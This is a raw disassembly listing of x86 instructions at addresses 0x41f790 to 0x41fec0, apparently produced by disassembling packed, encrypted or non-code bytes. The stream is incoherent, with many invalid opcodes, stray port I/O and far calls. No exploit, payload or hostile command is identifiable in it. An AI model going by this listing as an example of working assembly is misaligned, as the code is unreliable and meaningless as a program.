  41f790:	and    dh,BYTE PTR [ebp+ebx*4+0x76]
  41f794:	push   0x2
  41f796:	fld    st(4)
  41f798:	sub    al,0x46
  41f79a:	sbb    BYTE PTR [ebx],cl
  41f79c:	mov    esi,0x8769b9bc
  41f7a1:	icebp  
  41f7a2:	adc    DWORD PTR [eax],ebx
  41f7a4:	pop    ebx
  41f7a5:	(bad)  
  41f7a7:	das    
  41f7a8:	dec    edi
  41f7a9:	data16 mov cl,0xad
  41f7ac:	into   
  41f7ad:	dec    eax
  41f7ae:	mov    ch,BYTE PTR ds:0x49913c54
  41f7b4:	and    esi,DWORD PTR [edx+eiz*8+0x635f036]
  41f7bb:	les    esp,FWORD PTR [edx-0x6b]
  41f7be:	repnz mov dh,0x96
  41f7c1:	faddp  st(7),st
  41f7c3:	pop    edi
  41f7c4:	stos   DWORD PTR es:[edi],eax
  41f7c5:	push   ebp
  41f7c6:	xchg   DWORD PTR [ecx+0x7f],ebx
  41f7c9:	pop    eax
  41f7ca:	sub    ebx,esi
  41f7cc:	add    BYTE PTR [edi+0x7f],dh
  41f7cf:	jmp    0x41f752
  41f7d1:	xchg   BYTE PTR [eax],cl
  41f7d3:	jne    0x41f7d7
  41f7d5:	test   eax,0xb353839b
  41f7da:	xchg   edi,eax
  41f7db:	xchg   DWORD PTR [esi+edi*2-0x40],eax
  41f7df:	mov    ebx,ebp
  41f7e1:	push   ss
  41f7e2:	mov    ds:0xadc8afa3,al
  41f7e7:	mov    dh,0x32
  41f7e9:	neg    DWORD PTR [edi+0xb]
  41f7ec:	push   ecx
  41f7ed:	retf   
  41f7ee:	mov    cl,0x49
  41f7f0:	outs   dx,DWORD PTR ds:[esi]
  41f7f1:	pop    eax
  41f7f2:	sub    eax,0xa5d06b7e
  41f7f7:	shl    DWORD PTR [edi+0x10],1
  41f7fa:	pop    es
  41f7fb:	and    BYTE PTR [edx-0x15],bl
  41f7fe:	fxch   st(6)
  41f800:	hlt    
  41f801:	lods   eax,DWORD PTR ds:[esi]
  41f802:	sub    BYTE PTR [ebx-0x77],ah
  41f805:	adc    eax,0x6f5537c7
  41f80a:	shl    BYTE PTR [ebx],cl
  41f80c:	js     0x41f82b
  41f80e:	aam    0x94
  41f810:	loopne 0x41f7cf
  41f812:	xchg   esp,eax
  41f813:	fdiv   QWORD PTR [edi-0x62016b60]
  41f819:	test   BYTE PTR [esi],bl
  41f81b:	sbb    ecx,DWORD PTR [ebx]
  41f81d:	xchg   ecx,eax
  41f81e:	fwait
  41f81f:	add    eax,eax
  41f821:	in     eax,0x93
  41f823:	dec    eax
  41f824:	inc    esi
  41f825:	and    edx,ebx
  41f827:	daa    
  41f828:	lahf   
  41f829:	jne    0x41f83b
  41f82b:	and    DWORD PTR [ecx+ebp*1],0x21bc6e58
  41f832:	mov    bl,cl
  41f834:	aas    
  41f835:	out    dx,eax
  41f836:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  41f838:	mov    fs,WORD PTR [edx+0x7ad36773]
  41f83e:	or     dl,bh
  41f840:	xchg   di,ax
  41f842:	mov    cl,0x75
  41f844:	mov    al,ds:0xb3d0d390
  41f849:	pop    esp
  41f84a:	gs cli 
  41f84c:	sbb    BYTE PTR [ebp-0x4fe3f43e],dh
  41f852:	das    
  41f853:	data16 hlt 
  41f855:	call   0x4e672fc0
  41f85a:	sysenter 
  41f85c:	sbb    esi,ecx
  41f85e:	shl    DWORD PTR [bx],1
  41f861:	sar    esi,0x5a
  41f864:	mov    cs,ebx
  41f866:	lock and bl,ah
  41f869:	mov    esi,0xac7d8ca9
  41f86e:	jb     0x41f815
  41f870:	push   0x2c
  41f872:	or     al,0xc
  41f874:	cld    
  41f875:	mov    bl,0x2
  41f877:	adc    ch,bl
  41f879:	sub    bl,BYTE PTR [ecx-0x35dd6ed0]
  41f87f:	lea    edi,[ebx+0x51a1eee3]
  41f885:	lahf   
  41f886:	out    0xe9,al
  41f888:	xlat   BYTE PTR ds:[ebx]
  41f889:	test   BYTE PTR [ebp+0x3bbeb79c],ch
  41f88f:	(bad)  
  41f890:	dec    edi
  41f891:	lahf   
  41f892:	xchg   ebp,eax
  41f893:	xchg   esp,eax
  41f894:	ins    BYTE PTR es:[edi],dx
  41f895:	scas   al,BYTE PTR es:[edi]
  41f896:	xor    DWORD PTR [ebx+0x4b732674],ebx
  41f89c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f89d:	jae    0x41f891
  41f89f:	ficom  DWORD PTR [ecx+0x7e]
  41f8a2:	fbld   TBYTE PTR [eax+0x26]
  41f8a5:	into   
  41f8a6:	fstp   TBYTE PTR [edx+0x43f24ad0]
  41f8ac:	mov    bh,0x10
  41f8ae:	xor    al,0xd8
  41f8b0:	xchg   DWORD PTR [edi+0x56551159],eax
  41f8b6:	xor    esp,edi
  41f8b8:	and    ah,BYTE PTR [eax+0x2a]
  41f8bb:	adc    ah,dl
  41f8bd:	clc    
  41f8be:	arpl   WORD PTR [ebx+ecx*2-0x22],di
  41f8c2:	imul   edx,DWORD PTR [ebx+0x24],0x14ce08dc
  41f8c9:	and    DWORD PTR [esp+ebp*4+0x1f],esi
  41f8cd:	in     al,dx
  41f8ce:	sub    edx,DWORD PTR [ebx-0x5cb679cb]
  41f8d4:	lods   eax,DWORD PTR ds:[esi]
  41f8d5:	retf   0x1388
  41f8d8:	and    eax,0x4e9d114
  41f8dd:	loope  0x41f92c
  41f8df:	push   es
  41f8e0:	jecxz  0x41f8fe
  41f8e2:	rol    BYTE PTR [eax-0x2e],1
  41f8e5:	push   eax
  41f8e6:	cmp    BYTE PTR [ebp+0x5ace5ca5],cl
  41f8ec:	sub    al,0xe7
  41f8ee:	sub    eax,DWORD PTR [eax+0x24]
  41f8f1:	and    DWORD PTR [ebx],esp
  41f8f3:	call   0x96124150
  41f8f8:	inc    ebx
  41f8f9:	and    eax,0x207541af
  41f8fe:	aad    0xcf
  41f900:	mov    dh,0xd6
  41f902:	mov    ch,0x1b
  41f904:	sbb    DWORD PTR [ebp+0x2a],edx
  41f907:	sub    al,0x70
  41f909:	(bad)  
  41f90a:	or     DWORD PTR [esi],esp
  41f90c:	mov    esp,0x4d2294ae
  41f911:	jnp    0x41f91b
  41f913:	mov    bl,0xb5
  41f915:	gs add al,0x78
  41f918:	adc    eax,0x415f819d
  41f91d:	push   0x1
  41f91f:	test   eax,0xdad98df3
  41f924:	(bad)
  41f927:	add    edx,ecx
  41f929:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f92a:	dec    esp
  41f92b:	ja     0x41f94b
  41f92d:	fmul   DWORD PTR [edx]
  41f92f:	clc    
  41f930:	adc    DWORD PTR [eax+0x106e8688],edx
  41f936:	jb     0x41f9b1
  41f938:	test   al,0x26
  41f93a:	push   esp
  41f93b:	shr    BYTE PTR [edi],0xed
  41f93e:	outs   dx,BYTE PTR ds:[esi]
  41f93f:	repz xlat BYTE PTR ds:[ebx]
  41f941:	jmp    0x41f8c4
  41f943:	or     DWORD PTR [edi+0x78],0xfefee6fb
  41f94a:	and    edx,DWORD PTR [esi]
  41f94c:	lea    ebp,[eax+eax*8+0x5a423653]
  41f953:	mov    dh,0xe0
  41f955:	push   0xb
  41f957:	sub    al,0x95
  41f959:	cdq    
  41f95a:	jg     0x41f9bb
  41f95c:	dec    ebx
  41f95d:	and    dl,bl
  41f95f:	cwde   
  41f960:	dec    ebp
  41f961:	enter  0x57a0,0x99
  41f965:	fcom   st(1)
  41f967:	mov    ch,0x90
  41f969:	js     0x41f900
  41f96b:	out    0x87,al
  41f96d:	stos   DWORD PTR es:[edi],eax
  41f96e:	xchg   ebx,eax
  41f96f:	stc    
  41f970:	ins    DWORD PTR es:[edi],dx
  41f971:	and    bh,BYTE PTR [edx-0x64]
  41f974:	lahf   
  41f975:	(bad)  
  41f976:	retf   
  41f977:	mov    ebx,0xc576dbfc
  41f97c:	jb     0x41f9e8
  41f97e:	sub    eax,0xf13b2dbe
  41f983:	and    dh,BYTE PTR [edi+ebx*1]
  41f986:	or     al,0x9a
  41f988:	or     edx,DWORD PTR [ecx+ebp*1]
  41f98b:	out    dx,al
  41f98c:	jg     0x41f958
  41f98e:	lock inc ebp
  41f990:	ins    DWORD PTR es:[edi],dx
  41f991:	sbb    al,0x26
  41f993:	enter  0xa567,0x47
  41f997:	add    al,bh
  41f999:	popf   
  41f99a:	imul   ebx,DWORD PTR [ebp-0x40],0x40
  41f99e:	mov    ax,0x576a
  41f9a2:	aad    0xc1
  41f9a4:	lods   eax,DWORD PTR ds:[esi]
  41f9a5:	push   ds
  41f9a6:	loop   0x41f9be
  41f9a8:	mov    ah,bl
  41f9aa:	dec    esp
  41f9ab:	stos   DWORD PTR es:[edi],eax
  41f9ac:	inc    esp
  41f9ad:	push   edx
  41f9ae:	jne    0x41f97f
  41f9b0:	jp     0x41f960
  41f9b2:	sbb    BYTE PTR [ecx+edx*1-0x1df20a45],bl
  41f9b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f9ba:	fwait
  41f9bb:	lods   al,BYTE PTR ds:[esi]
  41f9bc:	call   0x21f3:0xd218c5c4
  41f9c3:	(bad)  
  41f9c4:	mov    ecx,0x443c33d1
  41f9c9:	ret    0xf4a9
  41f9cc:	sbb    eax,0xde60bb6e
  41f9d1:	sub    BYTE PTR [edx+ebx*8],dh
  41f9d4:	scas   eax,DWORD PTR es:[edi]
  41f9d5:	jo     0x41fa35
  41f9d7:	jge    0x41fa08
  41f9d9:	mov    ds,WORD PTR [ebx]
  41f9db:	cdq    
  41f9dc:	xchg   ebx,eax
  41f9dd:	rol    DWORD PTR [edx],1
  41f9df:	call   0xb486:0xf2461c0b
  41f9e6:	push   esi
  41f9e7:	ja     0x41f9fb
  41f9e9:	dec    edx
  41f9ea:	fisttp DWORD PTR [eax+0x3d]
  41f9ed:	inc    ecx
  41f9ee:	lock push cs
  41f9f0:	retf   0x75e8
  41f9f3:	mov    ds:0x5d7dd62f,eax
  41f9f8:	(bad)  
  41f9f9:	adc    eax,0xdd78bb81
  41f9fe:	out    dx,eax
  41f9ff:	xchg   ebp,eax
  41fa00:	das    
  41fa01:	or     dl,BYTE PTR [eax-0x246e0c77]
  41fa07:	pop    ecx
  41fa08:	enter  0x57e3,0x49
  41fa0c:	nop
  41fa0d:	mov    ds,WORD PTR [edx-0x686b1a4d]
  41fa13:	sti    
  41fa14:	stos   BYTE PTR es:[edi],al
  41fa15:	mov    BYTE PTR [edx+edi*1-0x61],bh
  41fa19:	jecxz  0x41fa8a
  41fa1b:	bound  esi,QWORD PTR [ecx+0x2c]
  41fa1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa1f:	aad    0xcb
  41fa21:	xchg   BYTE PTR [edi+0x41871373],ah
  41fa27:	pop    eax
  41fa28:	hlt    
  41fa29:	lock mov ah,0xdf
  41fa2c:	or     al,0x7
  41fa2e:	mov    dh,0x81
  41fa30:	(bad)  
  41fa31:	es add dl,cl
  41fa34:	mov    edi,0x8ee291ca
  41fa39:	pop    ds
  41fa3a:	xor    DWORD PTR [esi+eiz*8],ebp
  41fa3d:	jnp    0x41fa2e
  41fa3f:	cmp    BYTE PTR [ebp+0x70edd42a],ch
  41fa45:	in     eax,0x9d
  41fa47:	mov    bl,BYTE PTR fs:[ebx-0x5c]
  41fa4b:	cmc    
  41fa4c:	cmp    cl,BYTE PTR [edi+ebx*1+0x6d]
  41fa50:	shr    BYTE PTR [ebx+0x75],1
  41fa53:	push   cs
  41fa54:	push   eax
  41fa55:	sub    DWORD PTR [esi+ebx*2+0x5b5e1bbf],esi
  41fa5c:	fcom   QWORD PTR [ebp+edi*8-0x60bfb349]
  41fa63:	xchg   DWORD PTR [eax+0x5a],ecx
  41fa66:	mov    edx,0x1b88532b
  41fa6b:	mov    ebx,0x2989ce54
  41fa70:	loope  0x41fa23
  41fa72:	call   0xeccd:0x2d26b5c6
  41fa79:	mov    al,ds:0x72b4ae7b
  41fa7e:	cld    
  41fa7f:	and    eax,0xfdd96e17
  41fa85:	(bad)  
  41fa86:	or     DWORD PTR [esi],esi
  41fa88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa89:	out    dx,eax
  41fa8a:	ficomp WORD PTR [edx-0xc]
  41fa8d:	(bad)  [ebx+0x2b56b7f3]
  41fa93:	dec    esp
  41fa94:	sbb    DWORD PTR [ecx],ebp
  41fa96:	popa   
  41fa97:	xor    eax,0xd7addf54
  41fa9c:	and    cl,BYTE PTR [esi-0x49]
  41fa9f:	xchg   BYTE PTR [esp+eax*4],dh
  41faa2:	sti    
  41faa3:	and    al,0xf1
  41faa5:	sbb    DWORD PTR [edx+0x249276d0],ecx
  41faab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41faac:	test   esi,eax
  41faae:	xchg   esp,eax
  41faaf:	push   ebx
  41fab0:	or     cl,dh
  41fab2:	mov    al,ds:0x13dfd78e
  41fab7:	adc    DWORD PTR [ecx],esp
  41fab9:	(bad)  
  41faba:	in     ax,0xf3
  41fabd:	jle    0x41fae8
  41fabf:	and    bh,BYTE PTR [edx-0x750152ef]
  41fac5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fac6:	lods   al,BYTE PTR ds:[esi]
  41fac7:	mov    esi,0x6b1721c0
  41facc:	push   edx
  41facd:	mov    bh,0xf1
  41facf:	popf   
  41fad0:	dec    edi
  41fad1:	outs   dx,DWORD PTR ds:[esi]
  41fad2:	jo     0x41fb42
  41fad4:	push   0x4beb01d8
  41fad9:	and    dh,ch
  41fadb:	in     al,dx
  41fadc:	out    dx,al
  41fadd:	add    DWORD PTR [edx-0x55],eax
  41fae0:	ret    0xf5d7
  41fae3:	fisub  DWORD PTR es:[edi]
  41fae6:	jne    0x41fb5e
  41fae8:	aam    0x1c
  41faea:	or     eax,0xb9f06672
  41faef:	inc    esi
  41faf0:	fs aad 0xb8
  41faf3:	bound  ebp,QWORD PTR [edi+0x28]
  41faf6:	inc    ebp
  41faf7:	mov    al,ds:0xcd5aff32
  41fafc:	sahf   
  41fafd:	sbb    al,0x99
  41faff:	ds test eax,0x7f005b79
  41fb05:	mov    esp,0xcadd9799
  41fb0a:	mov    ebx,0x31b28af6
  41fb0f:	mov    eax,DWORD PTR [ebx+ebp*4+0x22]
  41fb13:	nop
  41fb14:	mov    ecx,0x74984239
  41fb19:	add    BYTE PTR [ebx],dl
  41fb1b:	or     bl,dl
  41fb1d:	pop    ss
  41fb1e:	repnz jmp 0x6382:0x13eb8d68
  41fb26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fb27:	sub    eax,0xe069ef65
  41fb2c:	push   ecx
  41fb2d:	shl    BYTE PTR [edi+eiz*8-0x17],0x5f
  41fb32:	rcl    DWORD PTR [esi-0x51],1
  41fb35:	retf   0x481e
  41fb38:	out    dx,al
  41fb39:	sbb    dl,dh
  41fb3b:	xor    bl,ch
  41fb3d:	shr    BYTE PTR [edx],0xc2
  41fb40:	ret    
  41fb41:	repz pop ecx
  41fb43:	jg     0x41fb37
  41fb45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb46:	and    BYTE PTR [eax+eiz*4-0x27f9331f],cl
  41fb4d:	mov    WORD PTR [ebp+0xc],ss
  41fb50:	hlt    
  41fb51:	pop    esp
  41fb52:	arpl   WORD PTR [eax],di
  41fb54:	jae    0x41fb21
  41fb56:	or     DWORD PTR [ebx],edx
  41fb58:	fwait
  41fb59:	aaa    
  41fb5a:	ret    0xca04
  41fb5d:	mov    esp,0x3cc3fc79
  41fb62:	mov    esi,0xfc5885bd
  41fb67:	mov    ecx,0x7081823f
  41fb6c:	lahf   
  41fb6d:	ficomp DWORD PTR [ebx-0x5e]
  41fb70:	sbb    DWORD PTR [edx+ebx*4-0x6ab39f6b],esi
  41fb77:	mov    DWORD PTR [eax-0x17d2272d],esi
  41fb7d:	scas   al,BYTE PTR es:[edi]
  41fb7e:	sub    eax,0xd096d9b1
  41fb83:	retf   
  41fb84:	shr    BYTE PTR [edi],0xe3
  41fb87:	pop    ss
  41fb88:	mov    al,ds:0x29987d0a
  41fb8d:	test   ah,dh
  41fb8f:	daa    
  41fb90:	sbb    BYTE PTR [ebp+0x10d1e11e],bl
  41fb96:	and    ebx,DWORD PTR [ebp+edi*1+0x15cc716d]
  41fb9d:	xchg   edi,eax
  41fb9e:	mov    cl,0xb5
  41fba0:	push   ss
  41fba1:	loop   0x41fbad
  41fba3:	inc    edi
  41fba4:	js     0x41fbab
  41fba6:	test   esp,eax
  41fba8:	dec    esi
  41fba9:	cs into 
  41fbab:	nop
  41fbac:	mov    esp,0xed690e71
  41fbb1:	mov    al,ds:0xf4f421c4
  41fbb6:	outs   dx,DWORD PTR ds:[esi]
  41fbb7:	test   eax,ebp
  41fbb9:	xchg   esi,eax
  41fbba:	push   ss
  41fbbb:	push   esp
  41fbbc:	mov    al,0x98
  41fbbe:	retf   0xe780
  41fbc1:	adc    eax,DWORD PTR [edx-0x2d]
  41fbc4:	scas   eax,DWORD PTR es:[edi]
  41fbc5:	add    ch,dh
  41fbc7:	push   ecx
  41fbc8:	je     0x41fc2d
  41fbca:	out    0x59,eax
  41fbcc:	int    0xb4
  41fbce:	sub    dh,BYTE PTR [esi-0x65]
  41fbd1:	dec    esp
  41fbd2:	or     cl,dh
  41fbd4:	adc    al,0x18
  41fbd6:	and    DWORD PTR [ebp+edi*1+0x24],0xffffffa8
  41fbdb:	adc    al,0xb
  41fbdd:	cmp    DWORD PTR [edx],edx
  41fbdf:	hlt    
  41fbe0:	mov    DWORD PTR [esp+ecx*4],edx
  41fbe3:	adc    al,0x73
  41fbe5:	or     al,0x44
  41fbe7:	mov    esi,0x991eedd
  41fbec:	sahf   
  41fbed:	push   esp
  41fbee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fbef:	xor    BYTE PTR [ebx+0x7d],cl
  41fbf2:	sbb    BYTE PTR ds:0x6748926b,dl
  41fbf8:	scas   eax,DWORD PTR es:[edi]
  41fbf9:	pop    esp
  41fbfa:	cmp    esp,DWORD PTR [edx]
  41fbfc:	jl     0x41fc20
  41fbfe:	repz dec edi
  41fc00:	loope  0x41fbc0
  41fc02:	jns    0x41fb84
  41fc04:	mov    bh,0x83
  41fc06:	lods   al,BYTE PTR ds:[esi]
  41fc07:	mov    cl,0x2a
  41fc09:	inc    esp
  41fc0a:	ficomp WORD PTR [ebx]
  41fc0c:	push   eax
  41fc0d:	aas    
  41fc0e:	mov    dh,0xe0
  41fc10:	mov    bh,dl
  41fc12:	int    0xec
  41fc14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc15:	dec    ebp
  41fc16:	std    
  41fc17:	mov    ch,BYTE PTR [esi-0x38]
  41fc1a:	cmp    al,0x16
  41fc1c:	outs   dx,BYTE PTR ds:[esi]
  41fc1d:	mov    ebp,0x192d5e2a
  41fc22:	stc    
  41fc23:	mov    ebx,0x11bf6ef6
  41fc28:	pop    ds
  41fc29:	push   edi
  41fc2a:	retf   
  41fc2b:	scas   al,BYTE PTR es:[edi]
  41fc2c:	test   al,0xb1
  41fc2e:	and    eax,0x9068615b
  41fc33:	mov    al,0x3f
  41fc35:	sub    ch,bh
  41fc37:	dec    edx
  41fc38:	sub    al,0xd3
  41fc3a:	hlt    
  41fc3b:	stos   BYTE PTR es:[edi],al
  41fc3c:	rcr    DWORD PTR [ebx],1
  41fc3e:	cs retf 0xc596
  41fc42:	mov    ah,0xf
  41fc44:	lea    eax,[edi-0x33baf73e]
  41fc4a:	and    bl,0xe1
  41fc4d:	gs xchg ecx,eax
  41fc4f:	pop    esi
  41fc50:	push   esi
  41fc51:	pusha  
  41fc52:	ret    0xec13
  41fc55:	jnp    0x41fc17
  41fc57:	jnp    0x41fbf9
  41fc59:	div    BYTE PTR [ecx-0x70]
  41fc5c:	mov    edx,0x2f699143
  41fc61:	out    dx,eax
  41fc62:	int3   
  41fc63:	or     eax,0xc47fff18
  41fc68:	jo     0x41fc39
  41fc6a:	sub    DWORD PTR [edi+0x4c],esp
  41fc6d:	das    
  41fc6e:	sub    cl,bh
  41fc70:	in     eax,0xb7
  41fc72:	sub    BYTE PTR [edx-0x9],0xb3
  41fc76:	ja     0x41fcdb
  41fc78:	out    0x5c,eax
  41fc7a:	xchg   ebx,eax
  41fc7b:	sub    al,0xe5
  41fc7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc7f:	fcom   QWORD PTR cs:[ebx]
  41fc82:	mov    eax,ds:0xb1d291de
  41fc87:	push   ecx
  41fc88:	xor    DWORD PTR [eax],0x51056dbd
  41fc8e:	icebp  
  41fc8f:	retf   
  41fc90:	add    eax,0x41875c9c
  41fc95:	fstp   DWORD PTR [esi+0x6]
  41fc98:	pop    esi
  41fc99:	and    eax,0x92024e06
  41fc9e:	fnsave [ecx+0x28]
  41fca1:	popa   
  41fca2:	scas   al,BYTE PTR es:[edi]
  41fca3:	bnd je 0x41fccb
  41fca6:	sub    BYTE PTR [ebx],bh
  41fca8:	vandps ymm3,ymm3,YMMWORD PTR [ebp+0x3a]
  41fcad:	xchg   ebp,eax
  41fcae:	in     al,0x4b
  41fcb0:	cli    
  41fcb1:	sbb    eax,0xb3aad7c9
  41fcb6:	cmp    ah,BYTE PTR [esi-0x60]
  41fcb9:	out    dx,eax
  41fcba:	push   0xffffffcd
  41fcbc:	push   edi
  41fcbd:	adc    ebp,DWORD PTR [edx+0x49]
  41fcc0:	(bad)  
  41fcc1:	ds (bad) 
  41fcc3:	or     DWORD PTR cs:[eax],ebx
  41fcc6:	dec    esp
  41fcc7:	pop    ss
  41fcc8:	(bad)  
  41fcc9:	cmc    
  41fcca:	jb     0x41fd0a
  41fccc:	popa   
  41fccd:	jl     0x41fce0
  41fccf:	dec    eax
  41fcd0:	in     al,dx
  41fcd1:	adc    eax,0x99519dd2
  41fcd6:	add    BYTE PTR [esi],ah
  41fcd8:	push   esp
  41fcd9:	outs   dx,DWORD PTR ds:[esi]
  41fcda:	mov    bh,0xbd
  41fcdc:	xchg   edi,eax
  41fcdd:	sti    
  41fcde:	(bad)  [edi]
  41fce0:	adc    eax,0x7ab476c1
  41fce5:	push   ebx
  41fce6:	mov    al,0xc1
  41fce8:	outs   dx,DWORD PTR ds:[esi]
  41fce9:	dec    ebp
  41fcea:	cmc    
  41fceb:	jns    0x41fd0c
  41fced:	aam    0xe0
  41fcef:	and    eax,0x444b34b3
  41fcf4:	xchg   edx,eax
  41fcf5:	popa   
  41fcf6:	js     0x41fd04
  41fcf8:	pop    esp
  41fcf9:	popa   
  41fcfa:	inc    edx
  41fcfb:	mov    esi,0x300bd44f
  41fd00:	mov    ebp,0x6c259615
  41fd05:	mov    eax,0x4f99c173
  41fd0b:	cmp    DWORD PTR [ebx],eax
  41fd0d:	sbb    cl,dl
  41fd0f:	in     eax,0xb4
  41fd11:	add    eax,0x703bbe92
  41fd16:	lock add esp,esi
  41fd19:	(bad)  ss:[eax+0x17]
  41fd1d:	xor    eax,0xc5d1cabf
  41fd22:	cmp    BYTE PTR [eax],al
  41fd24:	std    
  41fd25:	xchg   ecx,eax
  41fd26:	(bad)  
  41fd27:	sbb    BYTE PTR [edi],al
  41fd29:	add    ebx,eax
  41fd2b:	sar    BYTE PTR [edi+esi*4+0x6875eefb],1
  41fd32:	push   esp
  41fd33:	les    ebx,FWORD PTR [eax]
  41fd35:	lea    edx,[ecx+edi*8-0x52]
  41fd39:	sbb    BYTE PTR [esi-0x6c703ca5],al
  41fd3f:	mov    al,ds:0xc3a51bcc
  41fd44:	dec    ebx
  41fd45:	mov    esi,0xac275c2f
  41fd4a:	sbb    edi,edx
  41fd4c:	adc    BYTE PTR [edx+0x2010ccf4],0x98
  41fd53:	clc    
  41fd54:	adc    al,0x39
  41fd56:	adc    al,0xe3
  41fd58:	loop   0x41fd82
  41fd5a:	mov    cl,ah
  41fd5c:	xor    bl,BYTE PTR [ebx]
  41fd5e:	in     eax,0x6c
  41fd60:	adc    al,0x6f
  41fd62:	cld    
  41fd63:	mov    ds:0xe96eac52,al
  41fd68:	int    0x34
  41fd6a:	mov    ebx,DWORD PTR [ecx+0x23]
  41fd6d:	jp     0x41fdea
  41fd6f:	jmp    0x41fd91
  41fd71:	fsubr  QWORD PTR [eax+eax*8+0x5419e34]
  41fd78:	mov    eax,0x21672060
  41fd7d:	xor    dl,BYTE PTR [ebx]
  41fd7f:	out    dx,al
  41fd80:	jne    0x41fda3
  41fd82:	pop    ebp
  41fd83:	ins    BYTE PTR es:[edi],dx
  41fd84:	call   0x7caece7b
  41fd89:	aam    0x33
  41fd8b:	sub    dh,BYTE PTR cs:[ecx+0x3b]
  41fd8f:	(bad)  
  41fd90:	hlt    
  41fd91:	in     al,0xe0
  41fd93:	mov    esp,0xf035e9dd
  41fd98:	push   edi
  41fd99:	imul   ebx,esp,0xd3f524ad
  41fd9f:	(bad)  
  41fda0:	popa   
  41fda1:	fnstcw WORD PTR [ebx]
  41fda3:	retf   0x7f7a
  41fda6:	mov    al,ds:0xb8f0ee00
  41fdab:	push   ds
  41fdac:	mov    al,ds:0xf53f66f2
  41fdb1:	cmc    
  41fdb2:	mov    esi,0x43eb5282
  41fdb7:	mov    dh,0x9c
  41fdb9:	xor    eax,0xd4d199ec
  41fdbe:	push   cs
  41fdbf:	jb     0x41fe16
  41fdc1:	inc    ebx
  41fdc2:	gs add eax,0x40470882
  41fdc8:	int    0xd4
  41fdca:	ins    BYTE PTR es:[edi],dx
  41fdcb:	mov    eax,ds:0xbc3b963d
  41fdd0:	xlat   BYTE PTR ds:[ebx]
  41fdd1:	imul   edi,DWORD PTR [ecx-0x13014c1f],0x8803fe00
  41fddb:	dec    ebp
  41fddc:	sbb    edi,0xffffff89
  41fddf:	fcom   st(3)
  41fde1:	push   eax
  41fde2:	popf   
  41fde3:	pop    esi
  41fde4:	mul    DWORD PTR [esi-0x73442d2c]
  41fdea:	mov    dl,0x4b
  41fdec:	mov    DWORD PTR [edx+0xbca3545],ebx
  41fdf2:	mov    ebp,0x86449679
  41fdf7:	mov    edx,esp
  41fdf9:	xchg   edx,eax
  41fdfa:	mov    cl,0x12
  41fdfc:	sbb    DWORD PTR [ebx+0x141e0c49],0x5c
  41fe03:	xlat   BYTE PTR ds:[ebx]
  41fe04:	mul    DWORD PTR [edi+0x7e9cc47f]
  41fe0a:	(bad)  
  41fe0b:	int    0xf9
  41fe0d:	fadd   DWORD PTR [eax+0x48620e20]
  41fe13:	cwde   
  41fe14:	jge    0x41fdf3
  41fe16:	pop    esi
  41fe17:	fild   WORD PTR cs:[ebx+0x78]
  41fe1b:	outs   dx,DWORD PTR gs:[esi]
  41fe1d:	jg     0x41fdac
  41fe1f:	sahf   
  41fe20:	stos   DWORD PTR es:[edi],eax
  41fe21:	outs   dx,DWORD PTR ds:[esi]
  41fe22:	inc    edi
  41fe23:	dec    edi
  41fe24:	push   ebx
  41fe25:	xlat   BYTE PTR ds:[ebx]
  41fe26:	pop    edi
  41fe27:	pop    es
  41fe28:	mov    WORD PTR [ebp-0x6],?
  41fe2b:	inc    esp
  41fe2c:	ja     0x41fddc
  41fe2e:	cwde   
  41fe2f:	shl    BYTE PTR [edx-0x68],1
  41fe32:	cmp    edi,eax
  41fe34:	sub    eax,0xd6388485
  41fe39:	push   ecx
  41fe3a:	shr    BYTE PTR [edx+0x7e],cl
  41fe3d:	addr16 leave 
  41fe3f:	jecxz  0x41fe93
  41fe41:	pusha  
  41fe42:	mov    dl,0x4f
  41fe44:	xchg   esp,eax
  41fe45:	adc    al,0xb7
  41fe47:	retf   0x6397
  41fe4a:	dec    ebx
  41fe4b:	push   ebx
  41fe4c:	neg    BYTE PTR [esi+0x1055cc60]
  41fe52:	pop    ss
  41fe53:	daa    
  41fe54:	xlat   BYTE PTR ds:[bx]
  41fe56:	jno    0x41fe63
  41fe58:	dec    esp
  41fe59:	jno    0x41fde1
  41fe5b:	add    al,0x26
  41fe5d:	add    cl,BYTE PTR [ecx+0x27497b76]
  41fe63:	clc    
  41fe64:	add    edx,ebp
  41fe66:	xor    edx,esi
  41fe68:	aam    0x57
  41fe6a:	jecxz  0x41febc
  41fe6c:	sar    dh,1
  41fe6e:	sub    eax,0xadd88e11
  41fe73:	cwde   
  41fe74:	and    ecx,ebp
  41fe76:	or     edx,DWORD PTR [ecx-0x5ee65032]
  41fe7c:	aam    0x2
  41fe7e:	xlat   BYTE PTR ds:[ebx]
  41fe7f:	fsubp  st(7),st
  41fe81:	fsub   DWORD PTR [ebx-0x1bbed230]
  41fe87:	add    DWORD PTR [ebp+0x6c28fddd],edi
  41fe8d:	push   0xffffffc0
  41fe8f:	loope  0x41fefe
  41fe91:	test   DWORD PTR [edi+0x5d],ebx
  41fe94:	data16 fimul WORD PTR [edx+eax*2+0x6c]
  41fe99:	push   ecx
  41fe9a:	and    esi,DWORD PTR [ebx-0x25]
  41fe9d:	and    al,bh
  41fe9f:	(bad)  
  41fea0:	stos   DWORD PTR es:[edi],eax
  41fea1:	fwait
  41fea2:	nop
  41fea3:	fdiv   DWORD PTR [edx]
  41fea5:	out    dx,al
  41fea6:	ret    
  41fea7:	or     esi,DWORD PTR [ebx-0x30]
  41feaa:	cld    
  41feab:	or     al,0xf8
  41fead:	pop    ss
  41feae:	mov    ebp,DWORD PTR [eax-0x3fdc1030]
  41feb4:	mov    ch,0xef
  41feb6:	jnp    0x41fe4f
  41feb8:	test   al,0x6c
  41feba:	jb     0x41febb
  41febc:	iret   
  41febd:	jle    0x41fe6b
  41febf:	aas    
  41fec0:	mov    esi,?
